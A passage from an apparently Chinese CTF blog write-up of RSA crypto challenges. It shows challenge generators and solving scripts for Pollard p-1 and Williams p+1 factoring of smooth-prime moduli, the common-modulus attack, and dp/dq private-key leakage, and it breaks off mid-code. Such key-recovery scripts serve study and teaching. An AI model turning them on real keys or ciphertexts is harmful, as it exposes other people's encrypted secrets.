class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getMyPrime</span>(<span class="hljs-params">nbits</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> p.bit_length() &lt;= nbits:<br>            p *= choice(sieve_base)<br>        <br>        <span class="hljs-keyword">if</span> isPrime(p+<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span> p+<span class="hljs-number">1</span><br><br>p = getMyPrime(<span class="hljs-number">256</span>)<br>q = getMyPrime(<span class="hljs-number">256</span>)<br><br>n = p*q<br>e = <span class="hljs-number">65537</span><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 53763529836257082401813045869248978487210852880716446938539970599235060144454914000042178896730979463959004404421520555831136502171902051936080825853063287829</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 50368170865606429432907125510556310647510431461588875539696416879298699197677994843344925466156992948241894107250131926237473102312181031875514294014181272618</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp-4">exp</h3><blockquote><p>光滑数 (Smooth number)：指可以分解为小素数乘积的正整数</p><p>当p是N的因数，并且p−1是光滑数，可以考虑使用<code>Pollard's p-1</code>算法来分解N</p></blockquote><p>这篇文章讲的挺清晰的：</p><p><ahref="https://blog.csdn.net/qq_42667481/article/details/106729900">【大数分解】Pollard‘sp-1 method_大数分解程序-CSDN博客</a></p><p>其实就是计算<spanclass="math inline">\(gcd(a^{B!}-1,n)\)</span>是否存在，并且结果不为1也不为n，那么存在的那个值就是p</p><p>然后对于<spanclass="math inline">\(a^{B!}\)</span>，我们选取a=2，然后B!我们也从2开始累乘，</p><p>这里结合模的性质：<span class="math inline">\(a^{(x+1) !}\equiv\left(a^{x !} \bmod n\right)^{x+1} \quad(\bmodn)\)</span>，就能写出代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">53763529836257082401813045869248978487210852880716446938539970599235060144454914000042178896730979463959004404421520555831136502171902051936080825853063287829</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">50368170865606429432907125510556310647510431461588875539696416879298699197677994843344925466156992948241894107250131926237473102312181031875514294014181272618</span><br><br>a = <span class="hljs-number">2</span><br>m = <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    a = powmod(a, m, n)<br>    p = gcd(a-<span class="hljs-number">1</span>, n)<br>    <span class="hljs-keyword">if</span> p != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> p != n:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p=&quot;</span>,p)<br>        <span class="hljs-keyword">break</span><br>    m += <span class="hljs-number">1</span><br><br>q = n // p<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q=&quot;</span>,q)<br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = invert(e, phi)<br>m = powmod(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="rsa27p1光滑">[RSA2]7(p+1光滑)</h2><h3 id="main-6">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getMyPrime</span>(<span class="hljs-params">nbits</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> p.bit_length() &lt;= nbits:<br>            p *= choice(sieve_base)<br><br>        <span class="hljs-keyword">if</span> isPrime(p - <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span> p - <span class="hljs-number">1</span><br><br><br>p = getMyPrime(<span class="hljs-number">256</span>)<br>q = getMyPrime(<span class="hljs-number">256</span>)<br><br>n = p * q<br>e = <span class="hljs-number">65537</span><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 63398538193562720708999492397588489035970399414238113344990243900620729661046648078623873637152448697806039260616826648343172207246183989202073562200879290937</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 26971181342240802276810747395669930355754928952080329914687241779532014305320191048439959934699795162709365987652696472998140484810728817991804469778237933925</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp-5">exp</h3><blockquote><p>当p是N的因数，并且p+1是光滑数，可以考虑使用<code>Williams's p+1</code>算法来分解N</p></blockquote><p>不行，这玩意的原理有些过于复杂了，咱就先略过，当个脚本小子先，有时间再回来看吧😢</p><p><a href="https://www.nssctf.cn/note/set/6">文章列表 | NSSCTF</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># from sage.all_cmdline import *</span><br><span class="hljs-keyword">from</span> xenny.ctf.crypto.modern.asymmetric.rsa <span class="hljs-keyword">import</span> williams_pp1<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert, powmod<br><br><span class="hljs-comment"># p+1光滑</span><br>n = <span class="hljs-number">63398538193562720708999492397588489035970399414238113344990243900620729661046648078623873637152448697806039260616826648343172207246183989202073562200879290937</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">26971181342240802276810747395669930355754928952080329914687241779532014305320191048439959934699795162709365987652696472998140484810728817991804469778237933925</span><br><br>p, q = williams_pp1.attack(n, <span class="hljs-number">55</span>)<br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = invert(e, phi)<br>m = powmod(c, d, n)<br>flag = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>这个代码在WSL 2Ubuntu运行成功了，但在windows运行错误，不知道为什么</p><h2 id="rsa28共模攻击">[RSA2]8(共模攻击)</h2><h3 id="main-7">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br><br>n = p*q<br>e1 = getPrime(<span class="hljs-number">16</span>)<br>e2 = getPrime(<span class="hljs-number">16</span>)<br><br>m = bytes_to_long(flag)<br><br>c1 = <span class="hljs-built_in">pow</span>(m, e1, n)<br>c2 = <span class="hljs-built_in">pow</span>(m, e2, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e1 = <span class="hljs-subst">&#123;e1&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e2 = <span class="hljs-subst">&#123;e2&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c1 = <span class="hljs-subst">&#123;c1&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c2 = <span class="hljs-subst">&#123;c2&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 120294155186626082670474649118722298040433501930335450479777638508444129059776534554344361441717048531505985491664356283524886091709370969857047470362547600390987665105196367975719516115980157839088766927450099353377496192206005171597109864609567336679138620134544004766539483664270351472198486955623315909571</span><br><span class="hljs-string">e1 = 38317</span><br><span class="hljs-string">e2 = 63409</span><br><span class="hljs-string">c1 = 42703138696187395030337205860503270214353151588149506110731264952595193757235229215067638858431493587093612397165407221394174690263691095324298012134779703041752810028935711214038835584823385108771901216441784673199846041109074467177891680923593206326788523158180637665813642688824593788192044139055552031622</span><br><span class="hljs-string">c2 = 50460092786111470408945316270086812807230253234809303694007902628924057713984397041141665125615735752600114964852157684904429928771531639899496987905067366415806771003121954852465731110629459725994454904159277228514337278105207721011579794604761255522391446534458815389983562890631994726687526070228315925638</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp-6">exp</h3><p><strong>已知（n，e1，e2，c1，c2），求m。</strong></p><blockquote><p>当两个用户使用相同的模数N、不同的私钥时，加密同一明文消息时即存在共模攻击。</p><p>本题使用两组公钥对同一消息进行加密，经过观察我们可以发现这两种公钥的n是同一个n，也就是说模数相同，那么此时我们便可以使用共模攻击进行解密。</p></blockquote><p><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311151558469.png" /></p><p>扩展欧几里得算法（在<code>gmpy2</code>中的<code>gcdext</code>）</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311151605501.png"alt="image-20231115160526421" /><figcaption aria-hidden="true">image-20231115160526421</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">120294155186626082670474649118722298040433501930335450479777638508444129059776534554344361441717048531505985491664356283524886091709370969857047470362547600390987665105196367975719516115980157839088766927450099353377496192206005171597109864609567336679138620134544004766539483664270351472198486955623315909571</span><br>e1 = <span class="hljs-number">38317</span><br>e2 = <span class="hljs-number">63409</span><br>c1 = <span class="hljs-number">42703138696187395030337205860503270214353151588149506110731264952595193757235229215067638858431493587093612397165407221394174690263691095324298012134779703041752810028935711214038835584823385108771901216441784673199846041109074467177891680923593206326788523158180637665813642688824593788192044139055552031622</span><br>c2 = <span class="hljs-number">50460092786111470408945316270086812807230253234809303694007902628924057713984397041141665125615735752600114964852157684904429928771531639899496987905067366415806771003121954852465731110629459725994454904159277228514337278105207721011579794604761255522391446534458815389983562890631994726687526070228315925638</span><br><br><span class="hljs-built_in">print</span>(gcd(e1,e2))  <span class="hljs-comment"># 1</span><br>_,r,s = gcdext(e1,e2)       <span class="hljs-comment"># 扩展欧几里得算法求出r,s的值，满足e1*r + e2*s = 1</span><br>m = <span class="hljs-built_in">pow</span>(c1,r,n) * <span class="hljs-built_in">pow</span>(c2,s,n) % n   <span class="hljs-comment">#这个算式最后的结果就是m</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="rsa29dpdq泄漏攻击">[RSA2]9(dp&amp;dq泄漏攻击)</h2><h3 id="main-8">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br><br>n = p*q<br>e = getPrime(<span class="hljs-number">128</span>)<br>d = inverse(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>dp = d % (p-<span class="hljs-number">1</span>)<br>dq = d % (q-<span class="hljs-number">1</span>)<br><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p = <span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;q = <span class="hljs-subst">&#123;q&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;dp = <span class="hljs-subst">&#123;dp&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;dq = <span class="hljs-subst">&#123;dq&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 13070310882303377463944295715444821218324151935347454554272870042925400761984585838979931730897626589859098834802923539617244712852188293321626061072925723</span><br><span class="hljs-string">q = 10411551818233737389114520103233235272671271111546186997024935593000298916988792710521511848414549553426943998093077337023514210631662189798921671306236009</span><br><span class="hljs-string">c = 62492280219693914005334023569480350249964827909276875032578276064973191654731196407886841145547165693859745313398152742796887457192397932684370631253099255490064673499746314452067588181106154875239985334051909867580794242253066085627399488604907196244465911471895118443199543361883148941963668551684228132814</span><br><span class="hljs-string">dp = 11568639544706374912496682299967972464196129347160700749666263275305083977187758414725188926013198988871173614336707804756059951725809300386252339177953017</span><br><span class="hljs-string">dq = 3455040841431633020487528316853620383411361966784138992524801280785753201070735373348570840039176552952269927122259706586236960440300255065994052962742469</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp-7">exp</h3><p><strong>已知（p，q，c，dp，dq，e），求m。</strong></p><p>时刻记住：</p><p><span class="math display">\[\begin{align}Enc（pk，m∈Z_N^*）:c = m^e\ mod \ N\\Dec（sk，c）： m = c^d\ mod\ N\end{align}\]</span> 这里不知道e，那我们看它要怎么求</p><p>已知：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311151626021.png"alt="image-20231115162626957" /><figcaption aria-hidden="true">image-20231115162626957</figcaption></figure><p>解密：</p><p><span class="math inline">\(m \equiv c^d(\bmod n) \equiv c^d(\bmod p* q)=k * p * q+c^d\)</span></p><p>分别模p和模q，得到：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311151628906.png"alt="image-20231115162805814" /><figcaption aria-hidden="true">image-20231115162805814</figcaption></figure><blockquote><p>公式中的k1就是表示一个整数，不要多想，因为k1*p之后再modp就没了，只能说整个式子的推导很巧妙~</p></blockquote><p>到这里，m就已经解出来了，这是其中的一种方法，其实非常的简单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">13070310882303377463944295715444821218324151935347454554272870042925400761984585838979931730897626589859098834802923539617244712852188293321626061072925723</span><br>q = <span class="hljs-number">10411551818233737389114520103233235272671271111546186997024935593000298916988792710521511848414549553426943998093077337023514210631662189798921671306236009</span><br>c = <span class="hljs-number">62492280219693914005334023569480350249964827909276875032578276064973191654731196407886841145547165693859745313398152742796887457192397932684370631253099255490064673499746314452067588181106154875239985334051909867580794242253066085627399488604907196244465911471895118443199543361883148941963668551684228132814</span><br>dp = <span class="hljs-number">11568639544706374912496682299967972464196129347160700749666263275305083977187758414725188926013198988871173614336707804756059951725809300386252339177953017</span><br>dq = <span class="hljs-number">3455040841431633020487528316853620383411361966784138992524801280785753201070735373348570840039176552952269927122259706586236960440300255065994052962742469</span><br><br>mp = gmpy2.powmod(c, dp, p)<br>mq = gmpy2.powmod(c, dq, q)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(mp))<br><span class="hljs-built_in">print</span>(long_to_bytes(mq)) <span class="hljs-comment">#两个值一样</span><br></code></pre></td></tr></table></figure><h2 id="rsa210dp泄漏攻击">[RSA2]10(dp泄漏攻击)</h2><h3 id="main-9">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span> + <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">100</span><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br><br>n = p*q<br>e = <span class="hljs-number">65537</span><br>d = inverse(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>dp = d % (p-<span class="hljs-number">1</span>)<br><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;dp = <span class="hljs-subst">&#123;dp&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 79201858340517902370077926747686673001645933420450220163567700296597652438275339093680329918615445030212417351430952656177171126427547284822789947152085534939195866096891005587613262293569611913019639653984932469691636338705418303482885987114085769045348074530172292982433373154900841135911548332400167290083</span><br><span class="hljs-string">c = 70109332985937768446301118795636999352761371683181615470371772202170324747707233792154935611826981798791499937601162039878070094663516868746240133223110650205575807753345252087103328657073552992431511929172241702073381723302143955977662087561904058172777520360991685289300855900793806183473523998422682944404</span><br><span class="hljs-string">dp = 3098334089252415941833934532457314870210700261428241562420857845879512952043729097866485406309479489101668423603305497982177150304625615059119312238777275</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp-8">exp</h3><p><strong>已知（n，c，dp，e），求m。</strong></p><p>本题我们又有e了，但是却失去了了一个dq，怎么解决呢？不知道，上网搜一下吧i😭</p><p><span class="math display">\[\begin{align}&amp;∵dp≡d\mod(p-1)，∴e*dp≡e*d\mod(p-1)，∴e*dp=k_1(p-1)+e*d\\&amp;又∵ed≡1\mod(p-1)(q-1)，∴ed=k_2(p-1)(q-1)+1\\&amp;第二行代入第一行：\\&amp;e*dp=k_1(p-1)+k_2(p-1)(q-1)+1\\&amp;=(p-1)(k_1+k_2(q-1))+1\\&amp;∵dp&lt;p-1\\&amp;∴e＞(k_1+k_2(q-1))\\&amp;即(k_1+k_2(q-1))∈(1,e)\\&amp;令x=k_1+k_2(q-1)，用x遍历(1,e)即可求出p\\&amp;然后q=n//q\\\end{align}\]</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> libnum<br><br>n = <span class="hljs-number">79201858340517902370077926747686673001645933420450220163567700296597652438275339093680329918615445030212417351430952656177171126427547284822789947152085534939195866096891005587613262293569611913019639653984932469691636338705418303482885987114085769045348074530172292982433373154900841135911548332400167290083</span><br>c = <span class="hljs-number">70109332985937768446301118795636999352761371683181615470371772202170324747707233792154935611826981798791499937601162039878070094663516868746240133223110650205575807753345252087103328657073552992431511929172241702073381723302143955977662087561904058172777520360991685289300855900793806183473523998422682944404</span><br>dp = <span class="hljs-number">3098334089252415941833934532457314870210700261428241562420857845879512952043729097866485406309479489101668423603305497982177150304625615059119312238777275</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>    <span class="hljs-keyword">if</span> e * dp % x ==<span class="hljs-number">1</span>:<br>        p = (e*dp - <span class="hljs-number">1</span>) // x + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> n % p == <span class="hljs-number">0</span>:<br>            q = n // p<br>            d = invert(e, (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>))<br>            m = powmod(c,d,n)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(m))<br><br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311291147798.png"alt="image-20231129114702659" /><figcaption aria-hidden="true">image-20231129114702659</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#或者直接用xenny师傅的库</span><br><span class="hljs-keyword">from</span> xenny.ctf.crypto.modern.asymmetric.rsa <span class="hljs-keyword">import</span> dpleak<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>e = <span class="hljs-number">65537</span><br>n = <span class="hljs-number">79201858340517902370077926747686673001645933420450220163567700296597652438275339093680329918615445030212417351430952656177171126427547284822789947152085534939195866096891005587613262293569611913019639653984932469691636338705418303482885987114085769045348074530172292982433373154900841135911548332400167290083</span><br>c = <span class="hljs-number">70109332985937768446301118795636999352761371683181615470371772202170324747707233792154935611826981798791499937601162039878070094663516868746240133223110650205575807753345252087103328657073552992431511929172241702073381723302143955977662087561904058172777520360991685289300855900793806183473523998422682944404</span><br>dp = <span class="hljs-number">3098334089252415941833934532457314870210700261428241562420857845879512952043729097866485406309479489101668423603305497982177150304625615059119312238777275</span><br><br>m = dpleak.attack(dp,c,e=e,n=n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="rsa211e很大的dp泄露攻击">[RSA2]11(e很大的dp泄露攻击)</h2><h3 id="main-10">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span> + <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">80</span><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br><br>n = p*q<br>e = getPrime(<span 